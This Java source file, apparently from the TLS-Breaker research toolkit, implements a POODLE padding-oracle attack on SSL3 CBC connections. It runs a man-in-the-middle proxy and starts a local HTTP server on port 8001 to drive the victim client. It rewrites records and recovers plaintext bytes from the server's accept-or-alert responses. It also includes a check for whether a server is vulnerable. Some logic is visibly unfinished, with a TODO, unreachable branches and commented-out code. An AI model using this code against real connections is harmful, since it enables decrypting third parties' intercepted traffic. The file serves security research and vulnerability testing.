/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.poodle.impl;

import de.rub.nds.tlsbreaker.breakercommons.impl.Attacker;
import de.rub.nds.tlsbreaker.poodle.config.PoodleCommandConfig;
import de.rub.nds.tlsbreaker.poodle.util.MyHttpHandler;
import de.rub.nds.tlsbreaker.poodle.util.PoodleHTTPServer;
import de.rub.nds.tlsbreaker.poodle.util.PoodleUtils;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.CipherSuite;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.record.AbstractRecord;
import de.rub.nds.tlsattacker.core.record.parser.RecordParser;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.DefaultWorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.executor.MessageActionResult;
import de.rub.nds.tlsattacker.core.workflow.action.executor.ReceiveMessageHelper;
import de.rub.nds.tlsattacker.core.workflow.action.executor.SendMessageHelper;
import de.rub.nds.tlsattacker.core.workflow.action.executor.WorkflowExecutorType;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import com.beust.jcommander.internal.Console;
import com.sun.net.httpserver.*;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

/** 
 *
 */
public class PoodleAttacker extends Attacker<PoodleCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    MyHttpHandler httphandler;
    
    int i = 0;

    /**
     *
     * @param config
     * @param baseConfig
     */
    public PoodleAttacker(PoodleCommandConfig config, Config baseConfig) {
        super(config, baseConfig);

        // Start the Server which will signal the client
        httphandler = new MyHttpHandler();
        PoodleHTTPServer poodleHTTPServer = new PoodleHTTPServer(httphandler);
        poodleHTTPServer.startPoddleHTTPServer();
        CONSOLE.info(" Server started on port 8001");
    }

    @Override
    public void executeAttack() {

        int paddingLength = findPaddingLength();

        System.out.println(paddingLength);

        while (true) {
            CONSOLE.info("ITERATION: " + i);
            sendAModifiedMessage(paddingLength);
            i++;
        }
    }

    // TODO: First Part of the attack: Find padding length by adding one byte to the
    // mssage until the size changes
    public int findPaddingLength() {

        int paddingLength = 1;

        int startingMessageLength = 0;

        Config conf1 = config.createConfig();
        conf1.setWorkflowTraceType(WorkflowTraceType.SIMPLE_FORWARDING_MITM_PROXY);
        conf1.setDefaultRunningMode(RunningModeType.MITM);
        conf1.setWorkflowExecutorShouldClose(false);

        State state1 = new State(conf1);

        WorkflowExecutor workflowExecutor1 = WorkflowExecutorFactory.createWorkflowExecutor(
                WorkflowExecutorType.DEFAULT,
                state1);
        workflowExecutor1.executeWorkflow();

        // state.getInboundTlsContexts().get(0).

        ReceiveMessageHelper receiveMessageHelper1 = new ReceiveMessageHelper();

        try {
            MessageActionResult mar = receiveMessageHelper1.receiveMessages(state1.getInboundTlsContexts().get(0));

            // If there are no upcoming messages, just wait.
            if (mar.getMessageList().size() != 0) {

                // sendMessageHelper.sendRecords(mar.getRecordList(),
                // state.getOutboundTlsContexts().get(0));

                if (mar.getMessageList().size() == 0) {

                    CONSOLE.info("------->   Server sent no alert! Modified Message was accepted  <--------");

                    CONSOLE.info("=====================DECRYPTING BYTE=====================================");

                    // byte plain_padding_length = (byte) 7;

                    // byte[] block_to_decrypt = Arrays.copyOfRange(modified_bytes, 13, 13 +
                    // block_size);

                } else {
                    CONSOLE.info("The size of the message is:"
                            + mar.getMessageList().get(0).getCompleteResultingMessage().getValue().length);

                    startingMessageLength = mar.getMessageList().get(0).getCompleteResultingMessage().getValue().length;
                }
                state1.getInboundTlsContexts().get(0).getTransportHandler().closeConnection();
                state1.getOutboundTlsContexts().get(0).getTransportHandler().closeConnection();

            }

        } catch (Exception e) {
            System.out.println("No data yet");
            e.printStackTrace();
        }

        boolean foundPaddingLength = false;

        while (!foundPaddingLength) {

            Config conf = config.createConfig();
            conf.setWorkflowTraceType(WorkflowTraceType.SIMPLE_FORWARDING_MITM_PROXY);
            conf.setDefaultRunningMode(RunningModeType.MITM);
            conf.setWorkflowExecutorShouldClose(false);

            State state = new State(conf);

            WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                    WorkflowExecutorType.DEFAULT,
                    state);
            workflowExecutor.executeWorkflow();

            // state.getInboundTlsContexts().get(0).

            ReceiveMessageHelper receiveMessageHelper = new ReceiveMessageHelper();

            try {
                MessageActionResult mar = receiveMessageHelper.receiveMessages(state.getInboundTlsContexts().get(0));

                // If there are no upcoming messages, just wait.
                if (mar.getMessageList().size() != 0) {

                    // sendMessageHelper.sendRecords(mar.getRecordList(),
                    // state.getOutboundTlsContexts().get(0));

                    if (mar.getMessageList().size() == 0) {

                        CONSOLE.info("------->   Server sent no alert! Modified Message was accepted  <--------");

                        CONSOLE.info("=====================DECRYPTING BYTE=====================================");

                        // byte plain_padding_length = (byte) 7;

                        // byte[] block_to_decrypt = Arrays.copyOfRange(modified_bytes, 13, 13 +
                        // block_size);

                    } else {
                        CONSOLE.info("The size of the message is:"
                                + mar.getMessageList().get(0).getCompleteResultingMessage().getValue().length);

                        if (mar.getMessageList().get(0).getCompleteResultingMessage()
                                .getValue().length > startingMessageLength) {
                            CONSOLE.info("Padding length is: " + paddingLength);
                            CONSOLE.info("Message length found. Now starting with the main part of the attack!");
                            foundPaddingLength = true;
                        } else {
                            paddingLength++;
                        }
                    }
                    state.getInboundTlsContexts().get(0).getTransportHandler().closeConnection();
                    state.getOutboundTlsContexts().get(0).getTransportHandler().closeConnection();

                    if (foundPaddingLength) {
                        httphandler.paddingfound = true;
                        break;
                    }
                }

            } catch (Exception e) {
                System.out.println("No data yet");
                e.printStackTrace();
            }
        }
        return paddingLength;
    }

    // Second Part of the attack: Modify messages and send to server
    public void sendAModifiedMessage(int block_size) {

        Config conf = config.createConfig();
        conf.setWorkflowTraceType(WorkflowTraceType.SIMPLE_FORWARDING_MITM_PROXY);
        conf.setDefaultRunningMode(RunningModeType.MITM);
        conf.setWorkflowExecutorShouldClose(false);

        State state = new State(conf);

        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(WorkflowExecutorType.DEFAULT,
                state);
        workflowExecutor.executeWorkflow();

        // state.getInboundTlsContexts().get(0).

        ReceiveMessageHelper receiveMessageHelper = new ReceiveMessageHelper();
        SendMessageHelper sendMessageHelper = new SendMessageHelper();

        try {
            // System.out.println(inboundHandler);

            PoodleUtils poodleUtils = new PoodleUtils();

            MessageActionResult mar = receiveMessageHelper.receiveMessages(state.getInboundTlsContexts().get(0));

            // If there are no upcoming messages, just wait.
            if (mar.getMessageList().size() != 0) {

                CONSOLE.info("==============Before modification========================");
                CONSOLE.info(mar.getRecordList().get(0).getCompleteRecordBytes());
                CONSOLE.info("-------------------------------------------------------------");
                CONSOLE.info(mar.getRecordList().get(1).getCompleteRecordBytes());
                CONSOLE.info("==========================================================");

                // Modify the byte, putt a block as padding, skip 5 first bytes plus the first
                // block.
                byte[] modified_bytes = poodleUtils
                        .replacePaddingWithBlock(mar.getRecordList().get(1).getCompleteRecordBytes().getValue(), 8, 13);
                AbstractRecord modified_record = mar.getRecordList().get(1);

                modified_record.setCompleteRecordBytes(modified_bytes);

                RecordParser recordParser = new RecordParser(0, modified_bytes, ProtocolVersion.SSL3);

                AbstractRecord record = recordParser.parse();

                List<AbstractRecord> modified_record_list = new ArrayList<>();
                modified_record_list.add(0, mar.getRecordList().get(0));
                modified_record_list.add(1, record);

                CONSOLE.info("==================After modification=========================");
                CONSOLE.info(modified_record_list.get(0).getCompleteRecordBytes());
                CONSOLE.info("---------------------------------------------------------");
                CONSOLE.info(modified_record_list.get(1).getCompleteRecordBytes());
                CONSOLE.info("===============================================================");

                sendMessageHelper.sendRecords(modified_record_list, state.getOutboundTlsContexts().get(0));

                MessageActionResult mar2 = receiveMessageHelper.receiveMessages(state.getOutboundTlsContexts().get(0));

                if (mar2.getMessageList().size() == 0) {
                    CONSOLE.info("------->   Server sent no alert! Modified Message was accepted  <--------");

                    CONSOLE.info("=====================DECRYPTING BYTE=====================================");

                    // byte plain_padding_length = (byte) 7;

                    // byte[] block_to_decrypt = Arrays.copyOfRange(modified_bytes, 13, 13 +
                    // block_size);

                    byte[] block_before_message = Arrays.copyOfRange(modified_bytes, 5, 5 + block_size);

                    byte[] block_before_padding = Arrays.copyOfRange(modified_bytes,
                            modified_bytes.length - 2 * block_size,
                            (modified_bytes.length - 2 * block_size) + block_size);

                    // System.out.println(Hex.encodeHexString(block_to_decrypt));

                    byte found_byte = (byte) (block_before_message[7] ^ block_before_padding[7] ^ 0x07);

                    byte[] decrypted_string = { found_byte };

                    CONSOLE.info("Decrypted byte is: " + new String(decrypted_string));

                    httphandler.bytedecrypted = true;
                    i = 0;

                    CONSOLE.info("========================================================================");

                } else {
                    CONSOLE.info("==========================Alert found ===============================");
                    CONSOLE.info(mar2.getMessageList().get(0).getCompleteResultingMessage());

                    // byte[] block_to_decrypt = Arrays.copyOfRange(modified_bytes, 13, 13 +
                    // block_size);

                    // byte[] block_before_message = Arrays.copyOfRange(modified_bytes, 5, 5 +
                    // block_size);

                    // byte[] block_before_padding = Arrays.copyOfRange(modified_bytes,
                    // modified_bytes.length - 2 * block_size,
                    // (modified_bytes.length - 2 * block_size) + block_size);

                    // System.out.println(Hex.encodeHexString(block_to_decrypt));
                    // System.out.println(Hex.encodeHexString(block_before_message));
                    // System.out.println(Hex.encodeHexString(block_before_padding));
                    CONSOLE.info("===================================================================");
                }

                state.getInboundTlsContexts().get(0).getTransportHandler().closeConnection();
                state.getOutboundTlsContexts().get(0).getTransportHandler().closeConnection();

            }

        } catch (Exception e) {
            System.out.println("No data yet");
            e.printStackTrace();
        }

    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        Config tlsConfig = getTlsConfig();
        tlsConfig.setDefaultRunningMode(RunningModeType.CLIENT);
        tlsConfig.setHighestProtocolVersion(ProtocolVersion.SSL3);
        tlsConfig.setDefaultClientSupportedCipherSuites(getCbcCiphers());
        tlsConfig.setWorkflowTraceType(WorkflowTraceType.HELLO);
        State state = new State(tlsConfig);
        DefaultWorkflowExecutor executor = new DefaultWorkflowExecutor(state);
        executor.executeWorkflow();
        return WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, state.getWorkflowTrace());
    }

    private List<CipherSuite> getCbcCiphers() {
        List<CipherSuite> cbcs = new LinkedList<>();
        for (CipherSuite suite : CipherSuite.getImplemented()) {
            if (suite.isCBC()) {
                cbcs.add(suite);
            }
        }
        return cbcs;
    }
}
